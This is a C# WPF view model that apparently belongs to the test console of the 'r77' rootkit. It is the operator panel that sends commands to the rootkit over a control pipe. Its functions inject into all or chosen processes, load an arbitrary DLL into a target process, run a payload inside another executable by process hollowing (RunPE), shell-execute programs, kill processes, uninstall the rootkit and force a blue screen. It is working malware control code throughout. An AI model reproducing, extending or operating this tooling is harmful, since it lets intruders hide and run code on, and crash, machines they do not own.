using BytecodeApi.Extensions;
using BytecodeApi.Wpf;
using BytecodeApi.Wpf.Dialogs;
using System.IO;
using System.Windows;
using TestConsole.Helper;
using TestConsole.Model;

namespace TestConsole;

public sealed class ControlPipeUserControlViewModel : ViewModel
{
	public ControlPipeUserControl View { get; set; }

	public DelegateCommand R77TerminateServiceCommand => field ??= new(R77TerminateServiceCommand_Execute);
	public DelegateCommand R77UninstallCommand => field ??= new(R77UninstallCommand_Execute);
	public DelegateCommand R77PauseInjectionCommand => field ??= new(R77PauseInjectionCommand_Execute);
	public DelegateCommand R77ResumeInjectionCommand => field ??= new(R77ResumeInjectionCommand_Execute);
	public DelegateCommand ProcessesInjectCommand => field ??= new(ProcessesInjectCommand_Execute);
	public DelegateCommand ProcessesInjectAllCommand => field ??= new(ProcessesInjectAllCommand_Execute);
	public DelegateCommand ProcessesDetachCommand => field ??= new(ProcessesDetachCommand_Execute);
	public DelegateCommand ProcessesDetachAllCommand => field ??= new(ProcessesDetachAllCommand_Execute);
	public DelegateCommand ProcessesTerminateIdCommand => field ??= new(ProcessesTerminateIdCommand_Execute);
	public DelegateCommand ProcessesTerminateNameCommand => field ??= new(ProcessesTerminateNameCommand_Execute);
	public DelegateCommand ProcessesLoadLibraryCommand => field ??= new(ProcessesLoadLibraryCommand_Execute);
	public DelegateCommand UserShellExecCommand => field ??= new(UserShellExecCommand_Execute);
	public DelegateCommand UserRunPECommand => field ??= new(UserRunPECommand_Execute);
	public DelegateCommand SystemBsodCommand => field ??= new(SystemBsodCommand_Execute);

	public bool IsR77ServiceRunning { get; set => Set(ref field, value); }
	public int? InjectProcessId { get; set => Set(ref field, value); }
	public int? DetachProcessId { get; set => Set(ref field, value); }
	public int? TerminateProcessId { get; set => Set(ref field, value); }
	public string? TerminateProcessName { get; set => Set(ref field, value); }
	public int? ProcessesLoadLibraryId { get; set => Set(ref field, value); }
	public string? ProcessesLoadLibraryDllPath { get; set => Set(ref field, value); }
	public string? ShellExecPath { get; set => Set(ref field, value); }
	public string? ShellExecCommandLine { get; set => Set(ref field, value); }
	public string? RunPETargetPath { get; set => Set(ref field, value); }
	public string? RunPEPayloadPath { get; set => Set(ref field, value); }

	public ControlPipeUserControlViewModel(ControlPipeUserControl view)
	{
		View = view;

		BeginUpdate();
	}

	private async void BeginUpdate()
	{
		while (true)
		{
			IsR77ServiceRunning = R77ServiceUserControlViewModel.Singleton?.IsR77ServiceRunning == true;
			await Task.Delay(100);
		}
	}

	private void R77TerminateServiceCommand_Execute()
	{
		ControlPipe.Write(ControlCode.R77TerminateService);
	}
	private void R77UninstallCommand_Execute()
	{
		ControlPipe.Write(ControlCode.R77Uninstall);
	}
	private void R77PauseInjectionCommand_Execute()
	{
		ControlPipe.Write(ControlCode.R77PauseInjection);
	}
	private void R77ResumeInjectionCommand_Execute()
	{
		ControlPipe.Write(ControlCode.R77ResumeInjection);
	}
	private void ProcessesInjectCommand_Execute()
	{
		if (InjectProcessId == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.ProcessesInject.GetDescription() ?? ""),
				new LogTextItem("Specify a process ID.")
			);
			return;
		}

		ControlPipe.Write(ControlCode.ProcessesInject, BitConverter.GetBytes(InjectProcessId.Value), InjectProcessId.ToString());
	}
	private void ProcessesInjectAllCommand_Execute()
	{
		ControlPipe.Write(ControlCode.ProcessesInjectAll);
	}
	private void ProcessesDetachCommand_Execute()
	{
		if (DetachProcessId == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.ProcessesDetach.GetDescription() ?? ""),
				new LogTextItem("Specify a process ID.")
			);
			return;
		}

		ControlPipe.Write(ControlCode.ProcessesDetach, BitConverter.GetBytes(DetachProcessId.Value), DetachProcessId.ToString());
	}
	private void ProcessesDetachAllCommand_Execute()
	{
		ControlPipe.Write(ControlCode.ProcessesDetachAll);
	}
	private void ProcessesTerminateIdCommand_Execute()
	{
		if (TerminateProcessId == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.ProcessesTerminateId.GetDescription() ?? ""),
				new LogTextItem("Specify a process ID.")
			);
			return;
		}

		ControlPipe.Write(ControlCode.ProcessesTerminateId, BitConverter.GetBytes(TerminateProcessId.Value), TerminateProcessId.ToString());
	}
	private void ProcessesTerminateNameCommand_Execute()
	{
		TerminateProcessName = TerminateProcessName?.Trim().ToNullIfEmpty();

		if (TerminateProcessName == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.ProcessesTerminateName.GetDescription() ?? ""),
				new LogTextItem("Specify a name.")
			);
			return;
		}

		using MemoryStream memoryStream = new();
		using BinaryWriter writer = new(memoryStream);

		writer.Write(TerminateProcessName.ToUnicodeBytes());
		writer.Write((short)0);

		ControlPipe.Write(ControlCode.ProcessesTerminateName, memoryStream.ToArray(), TerminateProcessName);
	}
	private void ProcessesLoadLibraryCommand_Execute()
	{
		ProcessesLoadLibraryDllPath = ProcessesLoadLibraryDllPath?.Trim().ToNullIfEmpty();

		if (ProcessesLoadLibraryId == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.ProcessesLoadLibrary.GetDescription() ?? ""),
				new LogTextItem("Specify a process ID.")
			);
			return;
		}

		if (ProcessesLoadLibraryDllPath == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.ProcessesLoadLibrary.GetDescription() ?? ""),
				new LogTextItem("Specify a DLL path.")
			);
			return;
		}

		if (!File.Exists(ProcessesLoadLibraryDllPath))
		{
			Log.Error(
				new LogTextItem("File"),
				new LogFileItem(Path.GetFileName(ProcessesLoadLibraryDllPath)),
				new LogTextItem("not found.")
			);
			return;
		}

		using MemoryStream memoryStream = new();
		using BinaryWriter writer = new(memoryStream);

		writer.Write(ProcessesLoadLibraryId.Value);
		writer.Write(ProcessesLoadLibraryDllPath.ToUnicodeBytes());
		writer.Write((short)0);

		ControlPipe.Write(ControlCode.ProcessesLoadLibrary, memoryStream.ToArray(), $"{ProcessesLoadLibraryId} -> {ProcessesLoadLibraryDllPath}");
	}
	private void UserShellExecCommand_Execute()
	{
		ShellExecPath = ShellExecPath?.Trim().ToNullIfEmpty();
		ShellExecCommandLine = ShellExecCommandLine?.Trim().ToNullIfEmpty();

		if (ShellExecPath == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.UserShellExec.GetDescription() ?? ""),
				new LogTextItem("Specify a path.")
			);
			return;
		}

		using MemoryStream memoryStream = new();
		using BinaryWriter writer = new(memoryStream);

		writer.Write(ShellExecPath.ToUnicodeBytes());
		writer.Write((short)0);
		if (ShellExecCommandLine != null) writer.Write(ShellExecCommandLine.ToUnicodeBytes());
		writer.Write((short)0);

		ControlPipe.Write(ControlCode.UserShellExec, memoryStream.ToArray(), ShellExecPath + (ShellExecCommandLine == null ? null : $" {ShellExecCommandLine}"));
	}
	private void UserRunPECommand_Execute()
	{
		RunPETargetPath = RunPETargetPath?.Trim().ToNullIfEmpty();
		RunPEPayloadPath = RunPEPayloadPath?.Trim().ToNullIfEmpty();

		if (RunPETargetPath == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.UserRunPE.GetDescription() ?? ""),
				new LogTextItem("Specify a target path.")
			);
			return;
		}

		if (!File.Exists(RunPETargetPath))
		{
			Log.Error(
				new LogTextItem("File"),
				new LogFileItem(Path.GetFileName(RunPETargetPath)),
				new LogTextItem("not found.")
			);
			return;
		}

		if (RunPEPayloadPath == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.UserRunPE.GetDescription() ?? ""),
				new LogTextItem("Specify a payload.")
			);
			return;
		}

		if (!File.Exists(RunPEPayloadPath))
		{
			Log.Error(
				new LogTextItem("File"),
				new LogFileItem(Path.GetFileName(RunPEPayloadPath)),
				new LogTextItem("not found.")
			);
			return;
		}

		using MemoryStream memoryStream = new();
		using BinaryWriter writer = new(memoryStream);

		writer.Write(RunPETargetPath.ToUnicodeBytes());
		writer.Write((short)0);
		writer.Write((int)new FileInfo(RunPEPayloadPath).Length);
		writer.Write(File.ReadAllBytes(RunPEPayloadPath));

		ControlPipe.Write(ControlCode.UserRunPE, memoryStream.ToArray(), $"{Path.GetFileName(RunPEPayloadPath)} -> {Path.GetFileName(RunPETargetPath)}");
	}
	private void SystemBsodCommand_Execute()
	{
		if (Dialog
			.Title("BSOD")
			.Text("This command will trigger a blue screen.")
			.Icon(DialogIcon.ShieldWarningYellowBar)
			.CommandLink(DialogResult.Yes, "Trigger BSOD")
			.Button(DialogResult.Cancel)
			.Show(Window.GetWindow(View)) == DialogResult.Yes)
		{
			ControlPipe.Write(ControlCode.SystemBsod);
		}
	}
}